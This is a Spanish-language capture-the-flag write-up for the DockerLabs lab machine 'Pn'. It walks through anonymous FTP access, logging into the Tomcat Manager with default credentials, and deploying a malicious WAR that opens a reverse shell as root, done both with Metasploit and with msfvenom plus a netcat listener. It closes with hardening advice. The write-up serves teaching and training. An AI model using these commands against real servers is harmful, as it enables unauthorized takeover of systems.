# Pn (DockerLabs) — Writeup

Dificultad: fácil

Esta máquina es un homenaje casi de manual a un clásico que lleva años apareciendo en pentests reales: un Tomcat Manager con credenciales de fábrica que nadie se molestó en cambiar. La particularidad es que aquí ni siquiera hace falta adivinarlas a ciegas — el propio sistema, a través de un FTP mal configurado, casi nos pide disculpas de antemano por lo mal montado que está todo.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El reto combina dos fallos que, en un entorno de producción real, aparecen juntos con más frecuencia de la que gustaría admitir: un servicio FTP abierto al público sin ningún control de acceso, y una consola de administración de Tomcat expuesta con credenciales que vienen de ejemplo en la documentación oficial desde hace años. Una vez dentro del Tomcat Manager, el camino a ejecución remota de código es prácticamente automático, gracias a que Tomcat está diseñado precisamente para desplegar aplicaciones — y una aplicación maliciosa se despliega exactamente igual que una legítima.

---

## Paso 0: el objetivo está vivo

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.069 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.043 ms
4 packets transmitted, 4 received, 0% packet loss
```

TTL 64: sistema Unix/Linux. Confirmado y a otra cosa.

---

## Paso 1: qué hay expuesto

```bash
nmap -sS -sC -sV --min-rate 5000 -n -vvv -Pn -oN escaneo.txt 172.17.0.2
```

| Puerto | Estado | Servicio | Versión |
|---|---|---|---|
| 21/tcp | abierto | FTP | vsftpd 3.0.5 |
| 8080/tcp | abierto | HTTP | Apache Tomcat 9.0.88 |

Dos servicios que, combinados, ya empiezan a dibujar el camino: un FTP que casi siempre esconde algo interesante, y un Tomcat corriendo en el puerto clásico 8080, que en la práctica es sinónimo de "aquí hay un panel de administración esperando a alguien".

---

## Paso 2: el FTP anónimo, otra vez el mismo cuento

```bash
ftp 172.17.0.2
```

Usuario `anonymous`, contraseña en blanco. Dentro hay un archivo con un nombre bastante revelador: `tomcat.txt`.

```bash
get tomcat.txt
cat tomcat.txt
```

```
Hello tomcat, can you configure the tomcat server? I lost the password...
```

Un mensaje que parece sacado de un ticket de soporte técnico mal gestionado: alguien está pidiendo ayuda para configurar el servidor Tomcat porque ha perdido la contraseña. Más allá de la anécdota, el mensaje confirma dos cosas: que el Tomcat existe y está mal administrado, y que probablemente nunca se llegó a cambiar la configuración por defecto, incluidas las credenciales que trae de fábrica.

---

## Paso 3: llamar a la puerta del Tomcat Manager

Apache Tomcat incluye, por defecto, una interfaz de administración web llamada **Tomcat Web Application Manager**, accesible normalmente en la ruta `/manager/html`. Esta interfaz permite, entre otras cosas, desplegar nuevas aplicaciones web directamente desde el navegador — una funcionalidad extremadamente útil para el administrador legítimo, y extremadamente peligrosa si cae en las manos equivocadas.

Al visitar la ruta se solicita autenticación HTTP básica. Dado el contexto del mensaje encontrado en el FTP, tiene sentido probar el par de credenciales que Tomcat trae documentado en sus guías de instalación de ejemplo, o variantes habituales del mismo estilo:

```
tomcat:s3cr3t   ← válida
```

Con esas credenciales, el panel de administración se abre por completo. A partir de aquí, ya no hace falta ninguna vulnerabilidad adicional — Tomcat va a hacer exactamente lo que está diseñado para hacer: desplegar lo que le subamos.

---

## Paso 4: convertir una funcionalidad legítima en ejecución de código

Un archivo **WAR** (Web Application Archive) es el formato estándar en el que se empaquetan las aplicaciones Java para ser desplegadas en un servidor Tomcat. El Manager permite subir uno directamente desde la interfaz web y, con un clic, desplegarlo como una nueva ruta activa del servidor. El problema es evidente en cuanto se piensa un segundo: Tomcat no distingue entre un WAR legítimo y uno que, en lugar de una aplicación web, contiene una reverse shell empaquetada con la misma extensión.

### Vía rápida: Metasploit ya tiene el módulo hecho

```bash
msfconsole
```

```
use exploit/multi/http/tomcat_mgr_upload
set HttpUsername tomcat
set HttpPassword s3cr3t
set RHOSTS 172.17.0.2
set RPORT 8080
set LHOST 192.168.0.104
set LPORT 4343
run
```

El módulo automatiza todo el proceso: genera el WAR malicioso, lo sube usando las credenciales proporcionadas, lo despliega, y accede a la ruta resultante para activar la shell.

```
[*] Meterpreter session 1 opened (192.168.0.104:4343 -> 172.17.0.2:54750)
meterpreter > shell

id
uid=0(root) gid=0(root) groups=0(root)
```

Root directo, sin ninguna escalada adicional — el propio servicio Tomcat corría con privilegios de root, algo bastante habitual (y bastante desaconsejable) en instalaciones poco cuidadas.

```bash
script /dev/null -c bash
```

Para dejar la sesión cómoda antes de seguir trabajando.

---

### Vía manual: entendiendo qué hace Metasploit por debajo

Para quien prefiera no depender de un módulo automatizado, el mismo resultado se consigue a mano con `msfvenom` y una conexión netcat clásica.

Generación del WAR malicioso:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.0.104 LPORT=4343 -f war -o shell.war
```

El payload `java/shell_reverse_tcp` construye una reverse shell escrita en Java, el lenguaje nativo de cualquier aplicación Tomcat, y el flag `-f war` la empaqueta exactamente en el formato que el Manager espera recibir para desplegarla como una aplicación más.

En una terminal aparte, se levanta el listener:

```bash
nc -lnvp 4343
```

Desde el navegador (o vía `curl` autenticado), se sube `shell.war` al Tomcat Manager y se despliega. Al acceder después a la ruta resultante (típicamente `/shell`), el payload se ejecuta en el servidor y la conexión llega al listener:

```
Connection received on 172.17.0.2 50834

id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
script /dev/null -c bash
# root@54aaf0a2f18d:/#
```

Mismo resultado, con la ventaja de entender exactamente qué está pasando en cada paso en lugar de confiar ciegamente en un módulo empaquetado.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Filtración inicial | Archivo `tomcat.txt` vía FTP anónimo |
| Credenciales encontradas | tomcat:s3cr3t (Tomcat Manager) |
| Vector de explotación | Subida y despliegue de WAR malicioso |
| Privilegio obtenido | root directo, sin escalada adicional |
| Herramientas | ftp, Metasploit / msfvenom, netcat |

---

## Qué falló aquí (y cómo se evita)

1. **FTP anónimo exponiendo información operativa.** Un archivo con el nombre `tomcat.txt` diciendo literalmente "perdí la contraseña" es, en la práctica, un mapa hacia la siguiente fase del ataque. Ningún servicio de transferencia de archivos debería permitir acceso anónimo a menos que sea estrictamente necesario, y jamás debería contener notas operativas del propio sistema.
2. **Credenciales por defecto en un panel de administración crítico.** Tomcat Manager con credenciales de ejemplo (o triviales) es uno de los hallazgos más recurrentes en auditorías reales, a pesar de llevar documentado como riesgo desde hace más de una década. El primer paso tras cualquier instalación de Tomcat debería ser cambiar esas credenciales y, si es posible, restringir el acceso al Manager solo desde redes internas.
3. **Servicio Tomcat ejecutándose con privilegios de root.** Ninguna aplicación de servidor debería correr como root salvo necesidad justificada. Aquí ese único fallo convirtió una consola de administración comprometida en compromiso total e inmediato del sistema, sin necesidad de ninguna escalada adicional.

---

## Referencias

- HackTricks — Apache Tomcat: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
- Metasploit — tomcat_mgr_upload: https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/
- revshells.com: https://www.revshells.com/
- DockerLabs: https://dockerlabs.es/
